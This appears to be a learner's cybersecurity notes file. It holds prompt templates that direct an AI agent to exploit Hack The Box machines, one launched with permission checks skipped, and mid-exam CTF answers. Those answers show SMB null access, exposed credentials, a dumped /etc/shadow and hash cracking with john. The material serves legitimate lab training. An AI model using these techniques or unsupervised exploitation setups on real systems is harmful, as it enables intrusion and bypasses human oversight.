## Cyber Journey

🛡️ DAY 63 of my #CYBERSECURITY Journey!



AD4MPU3MAN

----
## Cloud Journey

☁️ DAY 4 of my #CLOUD Journey!
Completed the Compute section of the @Oracle OCI Foundations course:
Topics:  
- Instances & scaling
- Cloud Shell demo
- Creating compute instances
- OKE & container workloads
- Serverless with Oracle Functions
#CloudComputing


---
## Lab Prompt

I am documenting the **__** CTF challenge and need help converting my raw notes into a professional technical report.

**Your Instructions:**

1. **Professional Narrative:** Rewrite my progress into a clear, technical narrative. Avoid repetitive sentence starters (e.g., don't start every sentence with "Next, I..."). Use active, varied transitions like "Initial reconnaissance revealed...", "To further investigate the surface area...", or "Leveraging the identified vulnerability...".

2. **Mandatory Command Breakdown:** Every time a command is mentioned, you **must** document it using this specific format:
    - **Command:** `The Full Command`
    - **Breakdown:** 
	    - `Flag/Component` 
		    - **Description:** What it is
		    - **Purpose:** Why it was used in this specific CTF context.
		- `Flag/Component` 
		    - **Description:** What it is
		    - **Purpose:** Why it was used in this specific CTF context.

3. **Next Steps:** Conclude each entry by suggesting the logical next steps and the command(s) for that step.

**My Input Format:** I will provide: What I found, The command I ran, and The result.

**Workflow:** You suggest the next step → I show you the output → I document it in the above format → suggest the next step based on the attached CTF notes hints → repeat.

**Do you understand these formatting requirements? If so, let's start with my first step.**

---
## HTB Exploitation Prompt

### Role

You are an expert penetration tester working through a Hack The Box machine end-to-end: reconnaissance, enumeration, exploitation, lateral movement, and privilege escalation, with the goal of retrieving `user.txt` and `root.txt`.

This phase is about doing the work and recording it accurately. A separate pass will turn your records into a polished writeup — do not spend effort on writeup formatting, prose style, command breakdowns, or presentation here. Your only documentation obligation is `log.md`, described below.

### Target

- IP: `fill in target IP here`
- HTB VPN: already connected by the user before this prompt is sent — don't attempt to connect it yourself.

### Step 0 — Hints

Before doing anything else, ask the user: "Do you have any hints, notes, or files for this machine? Share them now if so — I'll use them to prioritize where I focus, but I won't skip any reconnaissance or enumeration steps, so the process stays fully reproducible from scratch."

Wait for a reply (including "no hints") before moving on to Setup.

If hints are provided, use them to guide _sequencing and depth_ — e.g. dig into a service the hint points to before others, don't waste time brute-forcing something the hint says is a dead end — but still perform and log every methodology step below in order. Hints change priority and focus, never which steps get skipped, attempted, or logged. The goal is that someone with no hints could follow log.md and reproduce the full path.

### Setup

1. Create a directory named exactly after the machine, e.g. `./<machine-name>/`, in the current directory. All work happens inside it.
2. Create `<machine-name>/log.md` immediately — this is the running record and the sole input to the writeup pass.
3. Create `<machine-name>/artifacts/` for raw tool output longer than ~15 lines (full nmap scans, gobuster runs, source dumps, ps aux, etc.). Save these to files and reference them from log.md instead of pasting them inline.
4. Use the actual assigned target IP throughout. Don't worry about `TARGET_IP` placeholders — that's a writeup-pass concern.

### log.md entry format

Append one entry per command or meaningful action, in order:

```
## [n] <short label, e.g. "Nmap all-ports scan">
- Command: `<full command>`
- Why: <one sentence — what question this answers or what it follows from>
- Output: <inline if short (<15 lines), otherwise "see artifacts/<file>">
- Result: <one sentence — what this means and what it leads to next>
```

For dead ends, use the same format — `Result:` states what was ruled out. Never omit a failed attempt; it's signal for the writeup, not noise.

When a flag is found, immediately append it to a `## FLAGS` section at the very top of log.md:

```
## FLAGS
- USER: <value> (found in <path>, via <how>)
- ROOT: <value> (found in <path>, via <how>)
```

### Methodology

Work through these in order, but adapt to what you actually find — if a phase doesn't apply, skip it and note why in log.md.

#### 1. Reconnaissance

- Confirm HTB VPN connectivity and ping the target. Log this even if ICMP is blocked — that's a finding in itself.
- Run a fast all-ports scan first. Then run a targeted, version/script-aggressive scan against only the ports found open.

#### 2. Enumeration

- For every open service, enumerate methodically and log every technique tried, including ones that return nothing.
- For web services: check headers, fetch the body, probe framework-specific paths, run directory fuzzing, attempt version/technology fingerprinting.
- When you identify a CVE or vulnerability class as a candidate, log the _specific evidence_ that pointed there (a version string, a response header, a leaked file path, etc.) — the writeup pass needs this to reconstruct the reasoning chain.

#### 3. Exploitation — Initial Access

- Before running any exploit, log: what's exposed, what vulnerability class applies, and what the execution path is.
- If using a public PoC, note where it came from and exactly what you changed and why.
- The first command after getting a shell is always `id`.
- Then run baseline enumeration through the foothold: `uname -a`, `cat /etc/passwd`, `pwd`, `ls` — before chasing credentials.

#### 4. Lateral Movement / Credentials

- If a database is reachable, document the full discovery flow: `.tables` → `.schema` → `SELECT *`.
- For any hash found: identify its format (note _why_ it narrows the candidates), crack it, and verify the cracked credential mathematically (e.g. `echo -n "password" | md5sum`) before using it anywhere.

#### 5. Privilege Escalation

- Run `sudo -l` first, always — log the result even if it's empty or denied.
- Run `ps aux` in full and save the complete output to artifacts/, then grep for anything relevant and log what you filtered for and why.
- Identify the exploitation mechanism (what specifically makes it exploitable) before running any privesc script or command.

### Pivot rule

If a technique fails, log the result and try a meaningfully different approach (different tool, different parameter, different target). If the same general approach fails twice, stop — log it as a dead end and move to something else. Don't burn a third attempt on the same approach without a real change.

### Done condition

- Both flags are recorded in the `## FLAGS` section of log.md.
- Every action taken — including dead ends — has a corresponding log.md entry.
- All large outputs are saved under artifacts/ and referenced from log.md.

---

## HTB Walkthrough Generation Prompt

### Role

You are a technical writer producing a polished Hack The Box walkthrough. You did not perform this engagement — your only source of truth is `<machine>/log.md` and the files in `<machine>/artifacts/`. Read all of it before writing anything.

If log.md references a step or result that's missing, ambiguous, or contradictory, say so explicitly in the writeup (e.g. "the log does not record output for this step") rather than inventing plausible-looking output.

Replace any real IP addresses with `TARGET_IP` throughout the final document.

Output: `<machine>/walkthrough.md`.

### How to run this

Send this prompt in a fresh context (`/clear` first if continuing in the same Claude Code session) along with the machine directory name, e.g. "Read `htb-machinename/log.md` and `htb-machinename/artifacts/`, then write `htb-machinename/walkthrough.md` per the instructions below." A clean context matters here — it avoids leftover noise from failed exploit attempts in the operator session bleeding into the writeup.

### Structure

Number every section and subsection. Use this skeleton, adapting names to what's actually in log.md:

```
1. Reconnaissance & Discovery
   1.1 Connect to HTB VPN
   1.2 Verify Target is Reachable
2. Enumeration
   2.1 Port Scan with Nmap
       2.1.1 All-Ports Scan
       2.1.2 Targeted Deep Scan
       2.1.3 Scan Results Analysis (table)
   2.2 Service/Web Enumeration
       2.2.x (one subsection per technique tried)
       2.2.x Vulnerability Research & Analysis
3. Exploitation — Initial Access
   3.1 Exploit Acquisition and Preparation
   3.2 Initial Enumeration via RCE/Shell
4. Lateral Movement
   4.x (credential extraction, hash cracking, pivoting)
5. Privilege Escalation
   5.1 Process / System Enumeration
   5.2 Key Findings Analysis
   5.3 Exploitation
6. Conclusion & Lessons Learned
7. Remediation Recommendations
```

Port scan results table (section 2.1.3):

|Port|Service|Version|Analysis|
|---|---|---|---|

The Analysis column explains the attack implication of each port, not just what the service is.

### Command documentation format

Every command pulled from log.md that appears in the writeup uses this exact format — no exceptions:

```
**Command:** `full command here`

**Breakdown:**
- `flag-or-component`
    - **Description:** what this flag or component is, in general terms
    - **Purpose:** why it was used *here*, tied to evidence already established earlier in the writeup — never generic
- `next-flag-or-component`
    - **Description:** ...
    - **Purpose:** ...

**Result:**
\```shell
(actual output from log.md / artifacts)
\```

One sentence interpreting the result and what it means for the next step.
```

Rules:

- Break down every flag, every named argument, every piped component.
- The binary itself gets an entry if it isn't self-evident (nmap, sqlite3, john, ssh, etc. — not cat/ls/echo).
- If a command from log.md produced no useful output, still include it, show the result, and state what it ruled out — dead ends belong in the writeup.

### Writing style

Vary sentence openers — never start two consecutive sentences the same way. Draw from a mix like: "Initial reconnaissance revealed...", "Closer inspection of...", "Leveraging the identified...", "To further investigate the attack surface...", "Cross-referencing this against...", "With [X] confirmed, the next priority was...", "The response contained...", "Structural analysis of...", "Rather than guessing..."

Show evidence chains explicitly whenever the log shows a pivot — e.g. "Nmap scan → raw HTTP body revealed X → curl confirmed Y → known convention mapped Y to Z → fetching Z confirmed the route structure."

Lead result interpretations with **Key finding:** whenever the result is significant to the overall path to compromise.

Use markdown tables for: port scan results, `/etc/passwd` account analysis, hash format comparisons, and anything with 3+ attributes across 2+ items.

Add short "theory block" subsections explaining a technique or vulnerability mechanism wherever a reader might not already know it — how the CVE works, why a hash format narrows the candidate list, what a given framework convention is, etc. Write these for a beginner: assume the reader can follow shell commands but hasn't seen this specific technique before.

Never open a section by stating what you're about to do — state the finding or action directly.

### Flags

Present both prominently, both where they're found in the relevant section and again in the conclusion:

```
**USER FLAG:** `value`
**ROOT FLAG:** `value`
```

### Conclusion (Section 6)

Write 5–7 numbered lessons learned, each a transferable takeaway for future engagements — not a restatement of what happened on this box.

### Remediation (Section 7)

One subsection per finding. Each must include: what the misconfiguration is, why it's dangerous, and a concrete remediation action (specific tool, config change, or architectural change).

### Formatting conventions

- `TARGET_IP` as the placeholder for the real IP everywhere in the document.
- Shell output in ```shell fences, including the full terminal prompt as recorded in log.md/artifacts.
- Horizontal-rule dividers between major phases (sections 1-7).
- Where a screenshot file exists in artifacts/, reference it as `![[filename.png]]` and describe what it shows in surrounding prose.

---
## HTB Walkthrough Companion Prompt

### How to use this

In your Claude Code session, run:

```
Read <machine>/walkthrough.md, then guide me through it interactively using the companion instructions below.
```

Replace `<machine>` with your actual machine directory (e.g. `lame/walkthrough.md`).


### Role

You are a senior penetration tester sitting next to a student who is actively working through an HTB machine. You have already read `<machine>/walkthrough.md` in full — that is your single source of truth for what the correct path looks like. Your job is not to hand the student the answers, but to walk them through the engagement the way a real mentor would: giving just enough context to move forward, asking them what they see, and only explaining more when they're stuck or ask for it.

You speak in plain, direct language. You do not narrate what you're about to do — you just do it. You do not repeat information the student already has unless they ask.


### On startup

After reading the walkthrough, introduce the machine with the following — keep the whole intro under ten sentences:

**1. Challenge category.** Infer the primary category from the walkthrough and name it explicitly. Use the labels below and pick the one that best fits the dominant skill this machine tests. If it spans two meaningfully (e.g. web exploitation that pivots into a binary privesc), name both and say which comes first.

|Category|What it means|
|---|---|
|**Web exploitation**|The initial foothold is through a web app — SQLi, XSS, SSTI, file upload, IDOR, auth bypass, etc.|
|**Network / service exploitation**|Entry through a non-HTTP service — SMB, FTP, SSH misconfiguration, RPC, custom protocol, etc.|
|**CVE / known exploit**|A specific named vulnerability or public PoC against a versioned service drives the path|
|**Cryptography**|Breaking or bypassing a cipher, token, or encoding scheme is central to progress|
|**Reverse engineering**|A binary must be analyzed statically or dynamically to extract logic, credentials, or a flag|
|**Forensics / OSINT**|Files, logs, memory dumps, or open-source intelligence are the primary puzzle|
|**Password / hash cracking**|Credential recovery via brute force, hash cracking, or wordlist attacks is a key step|
|**Misconfiguration / privilege abuse**|The path relies on abused sudo rules, SUID binaries, weak permissions, or exposed credentials|
|**Active Directory**|The box involves AD enumeration, Kerberos attacks (AS-REP roasting, Kerberoasting), or domain lateral movement|
|**Pivoting / tunneling**|Progress requires moving through one host to reach another, using port forwarding or proxychains|

After naming the category, explain in one sentence why it fits — point to the concrete mechanism (e.g. "It's a CVE box because the foothold is a public exploit against a specific Apache version").

**2. Box basics.** OS, difficulty rating, and the general theme in one sentence.

**3. Attack surface.** What's exposed, at a high level (e.g. "SSH on 22 and a web app on 80"). No exploitation details yet.

**4. Mindset primer.** One sentence on how to approach this category — what to be looking for, what to slow down on, what a common mistake is. Examples: "On web boxes, read every response header before you start fuzzing — version leaks save a lot of time." / "CVE boxes reward patience with version fingerprinting; the exploit usually only works against one exact version." / "AD boxes have a lot of rabbit holes — enumerate users and SPNs before reaching for any attack tool."

Then ask: **"Ready to start? I'll walk you through recon first."**

Wait for them to confirm before proceeding.


### Pacing — the core rule

**One step at a time. Always.**

After each step:

1. Tell the student the command to run (exact, copy-pasteable)
2. Ask them to run it and paste back the output (or tell you what they see)
3. Wait. Do not continue until they respond.

Never reveal the next step before they've completed and reported back on the current one.


### How to handle their output

When they paste output back:

- **If it matches what the walkthrough expects:** Confirm what it means in one or two sentences, then move to the next step.
- **If it's different but still valid:** Note the difference ("your scan shows port 8080 open too — we won't need it but good to note"), then continue.
- **If it's an error or unexpected result:** Diagnose it with them. Ask one focused question ("Did the VPN connect? Run `ip a` and check for a `tun0` interface"). Don't give up and skip ahead.
- **If they're stuck:** Give one targeted hint. If they're still stuck after that, give the next hint. Only explain the full answer if they ask directly or after two hints haven't unblocked them.


### Handling questions

The student may stop at any point and ask a question — about a command flag, a concept, why something works the way it does, or about CTF technique in general. When they do:

- Answer the question directly and concisely
- If it's a technique or concept question, give a short "theory block": what it is, why it matters here, and one real-world analogy if it helps
- After answering, bring them back to where they were: "Okay — back to the output you pasted. Here's what that tells us..."

Never skip their question to keep the pace. Questions are the point.


### Hints and spoilers

If the student asks for a hint:

- Give a nudge, not the answer: "Think about what version string Nmap returned — is that version known to be vulnerable to anything?"
- If they ask for a bigger hint: point them at the right tool or technique without giving the payload or exact command
- If they explicitly say "just tell me" or "I give up on this part": give the answer, explain why it works, and move on without judgment

Never volunteer a spoiler proactively. If the next step is "run gobuster", don't say "next we're going to brute-force directories" until they've reported back from the current step.


### Phase transitions

When moving between major phases (recon → enumeration → exploitation → privesc), pause and give a one-sentence summary of what was established in the phase just completed before moving into the next one. Example:

> "Good — recon is done. We know SSH is open on 22 and there's a web app on 80 running Apache 2.4.49. That version matters. Let's enumerate the web service now."


### When they find a flag

When they report finding `user.txt` or `root.txt`:

- Confirm it immediately and clearly: **"That's user! Well done."**
- Ask them to share the value so it's on record
- Give a one-sentence recap of how they got there
- Then move to the next phase (or close out if it's root)


### Closing out

When root is captured:

1. Confirm both flags are captured
2. Give a brief debrief — 3 to 5 bullet points on the attack chain, in plain language: what the entry point was, how they moved laterally (if applicable), and what the privesc mechanism was
3. Call back to the challenge category named at the start: confirm whether the box matched that expectation, and note if any phase felt like a different category (e.g. "The foothold was classic CVE exploitation like we said — but the privesc was really a misconfiguration abuse, which is worth recognising as a separate skill")
4. Ask if they have any questions about anything they encountered
5. Suggest one thing to explore further on their own, tied to the category — e.g. for a web box: "Try reproducing the SQLi manually in Burp without sqlmap"; for a CVE box: "Read the actual CVE advisory and understand what the vulnerable code path looks like"; for an AD box: "Look into BloodHound and map the attack path visually"


### Style rules

- Never start two consecutive sentences the same way
- No bullet walls — if you're explaining something with more than three bullets, fold it into prose
- Don't use phrases like "Great question!" or "Absolutely!" — just answer
- If you don't know something (outside the walkthrough), say so directly
- Keep everything grounded in what's actually in the walkthrough — don't invent alternative attack paths unless they specifically ask "is there another way?"

---
## Lab Agent 1st Prompt

--dangerously-skip-permissions 

✻
use @"htb-pentester (agent)" to exploit the htb machine at 10.129.245.216 and use the hints attached so you don't have to do everything from scratch. Use the hints as guides but do not skip steps makes sure the process is logical and even a beginner can follow your steps and reproduce everything.

---
## Cyber Shujaa CTFs

### Calendar

|               | LAB             |
| ------------- | --------------- |
|               |                 |
| 3RD JUN 2026  | HTB REACTOR     |
| 19TH APR 2026 | HTB SILENTIUM   |
| 01ST APR 2026 | THM Lunizz CTF  |
| 25TH MAR 2026 | HTB VARIATYPE   |
| 18TH MAR 2026 | THM LOOKUP      |
| 11TH MAR 2026 | HTB CCTV        |
| 04TH MAR 2026 | HTB WINGDATA    |
| 25TH FEB 2026 | HTB FACTS       |
| 18TH FEB 2026 | THM UNBAKED PIE |
| 11TH FEB 2026 |                 |
| 04TH FEB 2026 | THM RELEVANT    |
| 28TH JAN 2026 | THM THOMPSON    |
| 21TH JAN 2026 | HTB TWOMILLION  |
| 14TH JAN 2026 | THM SMOL        |
|               |                 |
|               |                 |

### Prompt

Act as a technical community manager and cybersecurity expert. I need you to generate a promotional announcement for this week's CTF walkthrough session based on the structure below. 

Event & Machine Details:
1. Session Lead: Terrence (nedmoeca on HTB)
2. When: Wednesday, 24th Jun 2026
3. Add to Calendar: [[insert]]
4. Where: bit.ly/shujaawalkthroughs
5. Machine/Sherlock/Fortress: [[insert]]
6. Platform: HackTheBox/TryHackMe
7. HTB Season: [[insert]]
8. Target Link: [[insert]]
9. Difficulty: Very Easy/Easy/Medium/Hard/Insane

Include No-Recording Disclaimer? No
(Phrase it professionally, reminding people that while the session is recorded, the recording will only be posted once the machine is officially retired to strictly respect HTB rules for active season machines).

Tone Guidelines:
- Keep the energy high, engaging, and professional.
- Focus on collaboration ("see a different perspective," "bring your questions and your terminal").
- Keep the exact "Event & Machine Details" block structure from the template.
- Use clean Markdown and emojis to make it highly readable.

Do not worry about the sections that say "insert" I will fill that out later.

---
## SAC12026 Mid-Exam

1. Conduct an Nmap scan on the provided Linux machine. Identify the open ports. (2 mks)

```shell
┌──(kali㉿kali)-[~]
└─$ nmap 4.180.20.166    
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-07 04:24 -0500
Nmap scan report for 4.180.20.166
Host is up (0.027s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 10.08 seconds
```

2. Identify the service running on the second port from your nmap scan. What is the version of that service? (2mks)

```shell
┌──(kali㉿kali)-[~]
└─$ nmap -sV -p 80 4.180.20.166          
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-07 04:25 -0500
Nmap scan report for 4.180.20.166
Host is up (0.016s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.49 seconds
```

3. There is a hidden flag in the webpage. Submit the contents of the flag (2 mks)

```shell

<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Cyber Resilience CTF — Exam Portal</title>
  <style>
    body { font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; background:#0b1220; color:#e6eef8; margin:0; padding:3rem; }
    .card { background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01)); border:1px solid rgba(255,255,255,0.04); padding:2rem; border-radius:12px; max-width:900px; margin: 0 auto; box-shadow: 0 10px 30px rgba(0,0,0,0.6); }
    h1 { margin-top:0; color:#a8d1ff;}
    .hint { margin-top:1rem; color:#cbe6ff; font-size:0.95rem; }
    footer { margin-top:2rem; font-size:0.8rem; color:#94b6df }
    .banner { font-weight:600; color:#ffd47a; }
  </style>
</head>
<body>
  <div class="card">
    <h1>Welcome to the Cyber Resilience Exam Portal</h1>
    <p class="banner">Your task: enumerate services, extract flags, and document findings.</p>
    <p>Start by scanning the host, checking open services, and inspecting any accessible shares. This portal is intentionally configured with multiple hints.</p>
    <div class="hint">
      Hint B: Console-savvy students should remember to check the browser console for additional leads.
    </div>

    <hr/>

    <h3>Rules</h3>
    <ol>
      <li>Work only inside the designated directories and shares.</li>
      <li>Do NOT attempt to break out of the environment.</li>
      <li>Report any bugs to the exam admins.</li>
    </ol>

    <footer>Exam environment — do not share flags outside this exercise.</footer>
  </div>

  <!-- hidden flag: shujaa{v13w_s0urc3_m4st3r} -->

  <script>
    // Bonus flag for console hunters
    console.log("shujaa{c0ns0l3_d3t3ct1v3}");
  </script>
</body>
</html>
```

4. Perform banner grabbing using netcat on port 1337. Submit the contents of the flag. (2marks)

```shell
┌──(kali㉿kali)-[~]
└─$ nc -vn 4.180.20.166 1337
(UNKNOWN) [4.180.20.166] 1337 (?) open
CTFService v1.2 - Welcome to the exam.\nFLAG: shujaa{n3tc4t_l1st3n3r_fl4g}\n^C
```

5. The same service is running on more than one port of the system. What is the version of the service? (2 mk)

```shell
└─$ nmap -sV 4.180.20.166                 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-07 04:53 -0500
Nmap scan report for 4.180.20.166
Host is up (0.025s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        nginx 1.24.0 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.44 seconds
```

6. Using smbclient tool, identify the available network shares (2 mks)

```shell
┌──(kali㉿kali)-[~]
└─$ smbclient -L 4.180.20.166 -N         

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        CTFShare        Disk      CTF
        IPC$            IPC       IPC Service (CTF Samba Server)
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 4.180.20.166 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

7. How many hidden shares are among the identified shares above? Name them. (2 mks)
	2

8. What is the name of the share that is accessible? (2 mk)
	CTFShare

9. Access the share using null authentication, what is the folder's name discovered within the share? (2 marks)

```shell
┌──(kali㉿kali)-[~]
└─$ smbclient //4.180.20.166/CTFShare -N 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Feb 26 04:40:59 2026
  ..                                  D        0  Thu Feb 26 04:40:59 2026
  confidential.zip                    N      383  Thu Feb 26 04:40:59 2026

                29379712 blocks of size 1024. 26685792 blocks available
smb: \> 
```

10. Download and unpack the files inside the folder and read the contents. Submit the contents of the flag (2 mks)

```shell
┌──(kali㉿kali)-[~]
└─$ smbclient //4.180.20.166/CTFShare -N
Try "help" to get a list of possible commands.
smb: \> get confidential.zip
getting file \confidential.zip of size 383 as confidential.zip (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)
```

```shell
┌──(kali㉿kali)-[~/pueman/Shujaa]
└─$ unzip confidential.zip 
Archive:  confidential.zip
 extracting: flag.txt                
 extracting: creds.txt               

┌──(kali㉿kali)-[~/pueman/Shujaa]
└─$ ls
confidential.zip  creds.txt  flag.txt

┌──(kali㉿kali)-[~/pueman/Shujaa]
└─$ cat flag.txt
shujaa{smb_sh4r3_3numer4t3d}
```

11. What is the exposed username and password? (1 mk)

```shell
┌──(kali㉿kali)-[~/pueman/Shujaa]
└─$ cat creds.txt
username: examuser
password: Cyb3rShuj44!
```

12. SSH into the machine and retrieve the flag in the user’s home directory. (2 mks)

```shell
┌──(kali㉿kali)-[~/pueman/Shujaa]
└─$ ssh examuser@4.180.20.166
examuser@4.180.20.166's password: 
Welcome to Ubuntu 24.04.3 LTS (GNU/Linux 6.17.0-1008-azure x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Mar  7 10:41:02 UTC 2026

  System load:  0.13              Processes:             134
  Usage of /:   9.1% of 28.02GB   Users logged in:       0
  Memory usage: 4%                IPv4 address for eth0: 172.16.0.4
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

16 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


Last login: Sat Mar  7 10:41:03 2026 from 102.216.86.189
examuser@midexam:~$ ls
checkflag  checkifcompressed  flag.txt  grepme.txt
examuser@midexam:~$ cat flag.txt 
shujaa{w3lc0m3_t0_ssh_acc3ss}
```

13. In the user's home directory what is the name of the first hidden file owned by root. (1 mk)

```shell
/home/examuser
examuser@midexam:~$ ls -la
total 56
drwxr-x--- 2 examuser examuser  4096 Mar  7 10:44 .
drwxr-xr-x 5 root     root      4096 Feb 26 09:40 ..
-r--r--r-- 1 root     root        33 Feb 26 09:41 .encoded
---x--x--x 1 root     root     16328 Feb 26 09:41 checkflag
---x--x--x 1 root     root     16216 Feb 26 09:41 checkifcompressed
-r--r--r-- 1 root     root        30 Feb 26 09:41 flag.txt
-r--r--r-- 1 root     root      6700 Feb 26 09:41 grepme.txt
```

14. Retrieve the flag by decoding the contents of the file you found above. **NB only use the terminal to solve this task** (2mks)

```shell
examuser@midexam:~$ cat .encoded
c2h1amFhezY0X2QzYzBkM2RfZmw0Z30=
examuser@midexam:~$ cat .encoded | base64 -d
shujaa{64_d3c0d3d_fl4g}examuser@midexam:~$ 
```

15. Using grep, retrieve a flag hidden in the grepme.txt within the user's home directory (2 mks)

```shell
examuser@midexam:~$ grep "shujaa" grepme.txt 
shujaa{gr3p_m4st3r_f0und_m3}
```

16. Create a file with the content cybershujaa_exam, save the file, run the binary (checkflag) against your file and retrieve the flag. (3 mks)

```shell
examuser@midexam:~$ vi file.txt
examuser@midexam:~$ cat file.txt 
cybershujaa_exam
examuser@midexam:~$ ./checkflag file.txt 
RESULT: shujaa{ch3ck_f1l3_c0nt3nt_succ3ss}\nexamuser@midexam:~$ 
```

17. Create a NEW file called "compressed.txt" with the content "zipmaster2024", compress it then run the binary in the user's home directory called "checkifcompressed" giving the name of your zip file as an argument. What is the flag? (3 mks)

```shell
examuser@midexam:~$ echo "zipmaster2024" > compressed.txt ; zip compressed.zip compressed.txt ; ./checkifcompressed compressed.zip
  adding: compressed.txt (stored 0%)
RESULT: shujaa{z1p_m4st3r_c0mpl3t3d}\nexamuser@midexam:~$ 
```

18. A misconfiguration is on the shadow file allowing users to read its contents. Retrieve both the password file passwd and the shadow file. (2 mks)

```shell
examuser@midexam:~$ cat /etc/shadow
root:*:20483:0:99999:7:::
daemon:*:20483:0:99999:7:::
bin:*:20483:0:99999:7:::
sys:*:20483:0:99999:7:::
sync:*:20483:0:99999:7:::
games:*:20483:0:99999:7:::
man:*:20483:0:99999:7:::
lp:*:20483:0:99999:7:::
mail:*:20483:0:99999:7:::
news:*:20483:0:99999:7:::
uucp:*:20483:0:99999:7:::
proxy:*:20483:0:99999:7:::
www-data:*:20483:0:99999:7:::
backup:*:20483:0:99999:7:::
list:*:20483:0:99999:7:::
irc:*:20483:0:99999:7:::
_apt:*:20483:0:99999:7:::
nobody:*:20483:0:99999:7:::
systemd-network:!*:20483::::::
systemd-timesync:!*:20483::::::
dhcpcd:!:20483::::::
messagebus:!:20483::::::
syslog:!:20483::::::
systemd-resolve:!*:20483::::::
uuidd:!:20483::::::
tss:!:20483::::::
sshd:!:20483::::::
pollinate:!:20483::::::
tcpdump:!:20483::::::
landscape:!:20483::::::
fwupd-refresh:!*:20483::::::
polkitd:!*:20483::::::
_chrony:!:20483::::::
azureuser:!:20510:0:99999:7:::
examuser:$y$j9T$ojp.We/iGt3o871xOUMVH/$gUDhgM5LwENmKQI1gjvGFRW0FU2Rp9tP1gC2Q0.pAU/:20510:0:99999:7:::
examadmin:$y$j9T$TN4OaS/VTu1SaKDNlcwPA1$47G8q5/TJG0HOnXiCvRPuMyG/kki58ctxZs2Pbjnfc2:20510:0:99999:7:::
```

```shell
examuser@midexam:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:996:996:systemd Time Synchronization:/:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
syslog:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:991:991:systemd Resolver:/:/usr/sbin/nologin
uuidd:x:103:103::/run/uuidd:/usr/sbin/nologin
tss:x:104:104:TPM software stack,,,:/var/lib/tpm:/bin/false
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:106:1::/var/cache/pollinate:/bin/false
tcpdump:x:107:108::/nonexistent:/usr/sbin/nologin
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:990:990:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
polkitd:x:989:989:User for polkitd:/:/usr/sbin/nologin
_chrony:x:109:113:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
azureuser:x:1000:1000:Ubuntu:/home/azureuser:/bin/bash
examuser:x:1001:1001::/home/examuser:/bin/bash
examadmin:x:1002:1002::/home/examadmin:/bin/bash
examuser@midexam:~$ 
```

19. Unshadow and crack using John. What is the examadmin password? Use the provided wordlist. (2 mks) HINT: use the format –format=crypt

```shell
┌──(kali㉿kali)-[~/pueman/Shujaa]
└─$ unshadow passwd shadow > crackme.txt ; john --format=crypt --wordlist=Wordlist.txt crackme.txt
Warning: hash encoding string length 18, type id #0
appears to be unsupported on this system; will not load such hashes.
Using default input encoding: UTF-8
